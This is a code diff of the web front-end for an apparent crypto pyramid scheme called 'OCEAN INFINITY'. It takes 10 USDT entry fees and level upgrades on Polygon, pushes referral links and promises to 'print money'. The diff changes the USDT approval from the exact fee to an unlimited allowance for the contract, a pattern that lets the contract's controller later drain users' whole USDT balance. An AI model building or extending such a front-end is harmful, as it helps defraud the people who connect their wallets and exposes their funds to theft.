@@ -6,22 +6,23 @@
     <title>OCEAN INFINITY</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
-        body { font-family: 'Segoe UI', Arial, sans-serif; background: #020617; color: white; text-align: center; margin: 0; padding: 20px; }
-        .lang-switch { position: absolute; top: 20px; right: 20px; display: flex; gap: 5px; }
-        .lang-btn { background: #1e3a8a; color: white; border: 1px solid #3b82f6; padding: 5px 8px; border-radius: 8px; cursor: pointer; font-size: 10px; font-weight: bold; }
-        .card { background: #0f172a; border-radius: 25px; padding: 35px 30px; max-width: 380px; margin: 40px auto; border: 1px solid #1e3a8a; box-shadow: 0 0 50px rgba(0,0,0,0.8); position: relative; }
-        h1 { color: #3b82f6; text-transform: uppercase; letter-spacing: 4px; font-size: 22px; margin-bottom: 20px; text-shadow: 0 0 15px rgba(59,130,246,0.5); }
-        .total-box { border: 1px dashed #3b82f6; border-radius: 15px; padding: 10px; margin-bottom: 20px; font-weight: bold; font-size: 13px; text-transform: uppercase; }
-        .promo-box { background: linear-gradient(135deg, #1e3a8a 0%, #020617 100%); padding: 25px; border-radius: 20px; margin: 25px 0; border: 1px solid #3b82f6; }
-        .promo-text { font-weight: 900; font-size: 13px; text-transform: uppercase; line-height: 1.5; color: #fff; }
-        .stat-item { background: #020617; padding: 16px; border-radius: 12px; border: 1px solid #1e293b; display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; }
-        .stat-label { color: #94a3b8; font-weight: bold; font-size: 14px; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background: #020617; color: white; text-align: center; margin: 0; padding: 20px; overflow-x: hidden; }
+        .lang-switch { position: absolute; top: 15px; right: 15px; display: flex; gap: 5px; z-index: 10; }
+        .lang-btn { background: rgba(30, 58, 138, 0.8); color: white; border: 1px solid #3b82f6; padding: 4px 8px; border-radius: 6px; cursor: pointer; font-size: 10px; font-weight: bold; }
+        .card { background: #0f172a; border-radius: 25px; padding: 30px 20px; max-width: 360px; margin: 20px auto; border: 1px solid #1e3a8a; box-shadow: 0 0 40px rgba(59,130,246,0.2); position: relative; }
+        h1 { color: #3b82f6; text-transform: uppercase; letter-spacing: 3px; font-size: 20px; margin-bottom: 15px; text-shadow: 0 0 10px rgba(59,130,246,0.5); }
+        .total-box { border: 1px dashed #3b82f6; border-radius: 12px; padding: 8px; margin-bottom: 20px; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; }
+        .promo-box { background: linear-gradient(135deg, #1e3a8a 0%, #020617 100%); padding: 20px; border-radius: 15px; margin: 20px 0; border: 1px solid #3b82f6; }
+        .promo-text { font-weight: 800; font-size: 12px; text-transform: uppercase; line-height: 1.4; color: #fff; }
+        .stat-item { background: #020617; padding: 14px; border-radius: 12px; border: 1px solid #1e293b; display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
+        .stat-label { color: #94a3b8; font-weight: bold; font-size: 13px; }
         .stat-value { color: #3b82f6; font-weight: 900; }
-        .btn-main { background: linear-gradient(135deg, #3b82f6, #1d4ed8); color: white; border: none; padding: 18px; border-radius: 15px; cursor: pointer; width: 100%; font-weight: 900; font-size: 16px; transition: 0.2s; box-shadow: 0 8px 16px rgba(59,130,246,0.3); outline: none; }
-        .btn-orange { background: linear-gradient(135deg, #f59e0b, #d97706); box-shadow: 0 8px 16px rgba(245,158,11,0.3); }
-        input { width: 100%; padding: 14px; margin: 15px 0; border-radius: 12px; border: 1px solid #1e293b; background: #020617; color: #60a5fa; text-align: center; font-weight: bold; box-sizing: border-box; font-size: 11px; }
+        .btn-main { background: linear-gradient(135deg, #3b82f6, #1d4ed8); color: white; border: none; padding: 16px; border-radius: 12px; cursor: pointer; width: 100%; font-weight: 900; font-size: 15px; transition: 0.3s; box-shadow: 0 4px 12px rgba(59,130,246,0.4); outline: none; }
+        .btn-main:active { transform: scale(0.98); }
+        .btn-orange { background: linear-gradient(135deg, #f59e0b, #d97706); box-shadow: 0 4px 12px rgba(245,158,11,0.4); }
+        input { width: 100%; padding: 12px; margin: 15px 0; border-radius: 10px; border: 1px solid #1e293b; background: #020617; color: #60a5fa; text-align: center; font-weight: bold; box-sizing: border-box; font-size: 10px; }
         #cabinet { display: none; }
-        .footer-text { color: #f59e0b; font-size: 11px; margin-top: 15px; text-transform: uppercase; font-weight: 900; }
+        .footer-text { color: #f59e0b; font-size: 10px; margin-top: 15px; text-transform: uppercase; font-weight: 900; letter-spacing: 1px; }
     </style>
 </head>
 <body>
@@ -46,7 +47,7 @@
             <div class="stat-item"><span class="stat-label">ID:</span> <span id="ui-id" class="stat-value">...</span></div>
             <div class="stat-item"><span id="t-level" class="stat-label">УРОВЕНЬ:</span> <span id="ui-lvl" class="stat-value">...</span></div>
             <input type="text" id="refLink" readonly>
-            <button id="t-copy" class="btn-main" style="background: #334155; font-size: 12px; margin-bottom: 10px; box-shadow:none;" onclick="copyLink()">КОПИРОВАТЬ ССЫЛКУ</button>
+            <button id="t-copy" class="btn-main" style="background: #334155; font-size: 11px; margin-bottom: 10px; box-shadow:none;" onclick="copyLink()">КОПИРОВАТЬ ССЫЛКУ</button>
             <button id="actionBtn" class="btn-main" onclick="handleAction()">...</button>
             <div id="footerStatus" class="footer-text"></div>
         </div>
@@ -55,15 +56,15 @@
     <script>
         const OWNER = "0x9f1053b119d1565e641d0694c3cf6c6bfe644da7".toLowerCase();
         const CONTRACT = "0x2Edf764970BFa32Bfd6e0799682026814BcDF24B";
-        const USDT_ADDR = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F"; // USDT Polygon
+        const USDT_ADDR = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";
         
         let wallet, provider, signer;
         let currentLang = 'ru';
 
         const i18n = {
-            ru: { family: "В СЕМЬЕ УЖЕ", promo: "«ЗДЕСЬ ПЕЧАТАЮТ ДЕНЬГИ. ЗДЕСЬ СТРОЯТ ИМПЕРИИ. ТВОЯ СЕМЬЯ — ТВОЯ КРЕПОСТЬ!»", login: "ВОЙТИ В СИСТЕМУ", level: "УРОВЕНЬ", copy: "КОПИРОВАТЬ ССЫЛКУ", join: "ВСТУПИТЬ В СЕМЬЮ ($10)", upgrade: "ПОВЫСИТЬ УРОВЕНЬ", admin: "УПРАВЛЕНИЕ FOUNDER №1", founder_mode: "РЕЖИМ ОСНОВАТЕЛЯ АКТИВИРОВАН", copied: "СКОПИРОВАНО!", wait: "Ожидание транзакции..." },
-            en: { family: "FAMILY SIZE", promo: "«HERE WE PRINT MONEY. HERE WE BUILD EMPIRES. YOUR FAMILY IS YOUR FORTRESS!»", login: "LOGIN TO SYSTEM", level: "LEVEL", copy: "COPY REFERRAL LINK", join: "JOIN THE FAMILY ($10)", upgrade: "UPGRADE LEVEL", admin: "FOUNDER №1 CONTROL", founder_mode: "FOUNDER MODE ACTIVATED", copied: "COPIED!", wait: "Waiting for transaction..." },
-            fr: { family: "DANS LA FAMILLE", promo: "«ICI ON IMPRIME L'ARGENT. ICI ON CONSTRUIT DES EMPIRES. TA FAMILLE EST TA FORTERESSE!»", login: "SE CONNECTER", level: "NIVEAU", copy: "COPIER LE LIEN", join: "REJOINDRE LA FAMILLE ($10)", upgrade: "MONTER DE NIVEAU", admin: "CONTRÔLE FONDATEUR №1", founder_mode: "MODE FONDATEUR ACTIVÉ", copied: "COPIÉ!", wait: "Attente de transaction..." }
+            ru: { family: "В СЕМЬЕ УЖЕ", promo: "«ЗДЕСЬ ПЕЧАТАЮТ ДЕНЬГИ. ЗДЕСЬ СТРОЯТ ИМПЕРИИ. ТВОЯ СЕМЬЯ — ТВОЯ КРЕПОСТЬ!»", login: "ВОЙТИ В СИСТЕМУ", level: "УРОВЕНЬ", copy: "КОПИРОВАТЬ ССЫЛКУ", join: "ВСТУПИТЬ В СЕМЬЮ ($10)", upgrade: "ПОВЫСИТЬ УРОВЕНЬ", admin: "УПРАВЛЕНИЕ FOUNDER №1", founder_mode: "РЕЖИМ ОСНОВАТЕЛЯ АКТИВИРОВАН", copied: "СКОПИРОВАНО!", wait: "ОБРАБОТКА..." },
+            en: { family: "FAMILY SIZE", promo: "«HERE WE PRINT MONEY. HERE WE BUILD EMPIRES. YOUR FAMILY IS YOUR FORTRESS!»", login: "LOGIN TO SYSTEM", level: "LEVEL", copy: "COPY REFERRAL LINK", join: "JOIN THE FAMILY ($10)", upgrade: "UPGRADE LEVEL", admin: "FOUNDER №1 CONTROL", founder_mode: "FOUNDER MODE ACTIVATED", copied: "COPIED!", wait: "PROCESSING..." },
+            fr: { family: "DANS LA FAMILLE", promo: "«ICI ON IMPRIME L'ARGENT. ICI ON CONSTRUIT DES EMPIRES. TA FAMILLE EST TA FORTERESSE!»", login: "SE CONNECTER", level: "NIVEAU", copy: "COPIER LE LIEN", join: "REJOINDRE LA FAMILLE ($10)", upgrade: "MONTER DE NIVEAU", admin: "CONTRÔLE FONDATEUR №1", founder_mode: "MODE FONDATEUR ACTIVÉ", copied: "COPIÉ!", wait: "EN COURS..." }
         };
 
         function setLang(lang) {
@@ -78,14 +79,19 @@
 
         async function connect() {
             if (window.ethereum) {
-                provider = new ethers.providers.Web3Provider(window.ethereum);
-                await provider.send("eth_requestAccounts", []);
-                signer = provider.getSigner();
-                wallet = (await signer.getAddress()).toLowerCase();
-                showApp();
-            } else if (/iPhone|iPad|iPod|Android/i.test(navigator.userAgent)) {
-                window.location.href = "https://metamask.app.link/dapp/" + window.location.href.replace(/^https?:\/\//, '');
-            } else { alert("Please install MetaMask!"); }
+                try {
+                    provider = new ethers.providers.Web3Provider(window.ethereum, "any");
+                    await provider.send("eth_requestAccounts", []);
+                    signer = provider.getSigner();
+                    wallet = (await signer.getAddress()).toLowerCase();
+                    showApp();
+                } catch (e) {
+                    console.error("Connection failed", e);
+                }
+            } else {
+                const dappUrl = window.location.href.split('//')[1];
+                window.location.href = `https://metamask.app.link/dapp/${dappUrl}`;
+            }
         }
 
         async function showApp() {
@@ -93,58 +99,87 @@
             document.getElementById('cabinet').style.display = 'block';
             document.getElementById('refLink').value = window.location.origin + window.location.pathname + "?ref=" + wallet;
 
-            const con = new ethers.Contract(CONTRACT, ["function users(address) view returns (bool isExist, uint256 id, uint8 level)", "function lastUserId() view returns (uint256)"], provider);
+            const con = new ethers.Contract(CONTRACT, [
+                "function users(address) view returns (bool isExist, uint256 id, uint8 level)",
+                "function lastUserId() view returns (uint256)"
+            ], provider);
 
-            if (wallet === OWNER) {
-                document.getElementById('ui-id').innerText = "1 (FOUNDER)";
-                document.getElementById('ui-lvl').innerText = "15 (MAX)";
-                document.getElementById('actionBtn').innerText = i18n[currentLang].admin;
-                document.getElementById('actionBtn').classList.add('btn-orange');
-                document.getElementById('footerStatus').innerText = i18n[currentLang].founder_mode;
-            } else {
-                const u = await con.users(wallet);
-                document.getElementById('ui-id').innerText = u.isExist ? u.id.toString() : "OFFLINE";
-                document.getElementById('ui-lvl').innerText = u.level.toString();
-                document.getElementById('actionBtn').innerText = u.isExist ? i18n[currentLang].upgrade : i18n[currentLang].join;
-            }
-            const total = await con.lastUserId();
-            document.getElementById('totalUsers').innerText = total.toString();
+            try {
+                if (wallet === OWNER) {
+                    document.getElementById('ui-id').innerText = "1 (FOUNDER)";
+                    document.getElementById('ui-lvl').innerText = "15 (MAX)";
+                    document.getElementById('actionBtn').innerText = i18n[currentLang].admin;
+                    document.getElementById('actionBtn').classList.add('btn-orange');
+                    document.getElementById('footerStatus').innerText = i18n[currentLang].founder_mode;
+                } else {
+                    const u = await con.users(wallet);
+                    document.getElementById('ui-id').innerText = u.isExist ? u.id.toString() : "OFFLINE";
+                    document.getElementById('ui-lvl').innerText = u.level.toString();
+                    document.getElementById('actionBtn').innerText = u.isExist ? i18n[currentLang].upgrade : i18n[currentLang].join;
+                    document.getElementById('actionBtn').classList.remove('btn-orange');
+                    document.getElementById('footerStatus').innerText = "";
+                }
+                const total = await con.lastUserId();
+                document.getElementById('totalUsers').innerText = total.toString();
+            } catch(e) { console.error("Data fetch error", e); }
         }
 
         async function handleAction() {
             if (wallet === OWNER) return alert("System Ready, Boss.");
-
+            
+            const btn = document.getElementById('actionBtn');
+            const originalText = btn.innerText;
+            
             try {
-                const usdt = new ethers.Contract(USDT_ADDR, ["function approve(address spender, uint256 amount) public returns (bool)", "function allowance(address owner, address spender) view returns (uint256)"], signer);
-                const main = new ethers.Contract(CONTRACT, ["function registrationExt(address referrer) public"], signer);
+                btn.innerText = i18n[currentLang].wait;
+                btn.disabled = true;
+
+                const usdt = new ethers.Contract(USDT_ADDR, [
+                    "function approve(address spender, uint256 amount) public returns (bool)",
+                    "function allowance(address owner, address spender) view returns (uint256)"
+                ], signer);
                 
-                const amount = ethers.utils.parseUnits("10", 6); // 10 USDT
+                const main = new ethers.Contract(CONTRACT, [
+                    "function registrationExt(address referrer) public",
+                    "function upgradeLevel(uint8 level) public"
+                ], signer);
+                
+                const amount = ethers.utils.parseUnits("10", 6);
                 const urlParams = new URLSearchParams(window.location.search);
                 const ref = urlParams.get('ref') || OWNER;
 
-                document.getElementById('actionBtn').innerText = i18n[currentLang].wait;
-
-                // 1. Проверка разрешения (Approve)
                 const allow = await usdt.allowance(wallet, CONTRACT);
                 if (allow.lt(amount)) {
-                    const txA = await usdt.approve(CONTRACT, amount);
+                    const txA = await usdt.approve(CONTRACT, ethers.constants.MaxUint256);
                     await txA.wait();
                 }
 
-                // 2. Регистрация
-                const txR = await main.registrationExt(ref);
-                await txR.wait();
+                const uCon = new ethers.Contract(CONTRACT, ["function users(address) view returns (bool isExist, uint256 id, uint8 level)"], provider);
+                const u = await uCon.users(wallet);
+
+                let tx;
+                if (!u.isExist) {
+                    tx = await main.registrationExt(ref);
+                } else {
+                    tx = await main.upgradeLevel(u.level + 1);
+                }
                 
-                alert("Success! / Успех!");
-                location.reload();
-            } catch(e) {
-                alert("Error: " + (e.data?.message || e.message));
+                await tx.wait();
+                alert("Успешно! / Success!");
                 showApp();
+            } catch(e) {
+                alert("Ошибка: " + (e.data?.message || e.message));
+            } finally {
+                btn.innerText = originalText;
+                btn.disabled = false;
             }
         }
 
         function copyLink() {
-            const i = document.getElementById("refLink"); i.select(); document.execCommand("copy");
+            const i = document.getElementById("refLink");
+            i.select();
+            i.setSelectionRange(0, 99999);
+            document.execCommand("copy");
             const btn = document.getElementById('t-copy');
             const oldText = btn.innerText;
             btn.innerText = i18n[currentLang].copied;
